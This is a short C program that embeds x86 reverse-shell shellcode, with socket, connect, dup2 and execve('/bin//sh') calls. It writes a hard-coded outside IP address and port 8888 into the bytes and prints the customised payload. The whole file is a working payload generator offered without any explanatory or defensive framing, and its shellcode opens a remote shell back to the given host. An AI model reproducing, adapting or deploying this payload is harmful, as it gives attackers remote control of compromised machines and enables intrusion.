#include<stdio.h>
#include<stdlib.h>
#include<string.h>

//author : afang
//comment: what a nice day, isn't it?!


#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

char shellcode [] = "\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2"
                    "\x68\x7f\x00\x00\x01\x66\x68\x05\x39\x66\x68\x01\x02\x89"
                    "\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc9"
                    "\x51\x52\x31\xc0\xb0\x5a\x50\xcd\x80\xfe\xc1\x80\xf9\x03"
                    "\x75\xf0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                    "\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80";

void change_shellcode(const char *ip, unsigned short port)
{
   *((unsigned long*)(shellcode + 15)) = inet_addr(ip);
   *((unsigned short*)(shellcode + 21)) = htons(port);
}
void print_shellcode(void)
{
   int i;
   for(i = 0; i < sizeof(shellcode) - 1; i++)
   {
      printf("\\x%.2x", (unsigned char)shellcode[i]);
   }
   printf("\n");
}

int main(){

	char *ip = "138.128.204.246";
	unsigned short port = 8888;
	change_shellcode(ip,port);
	print_shellcode();
	return 0;
}

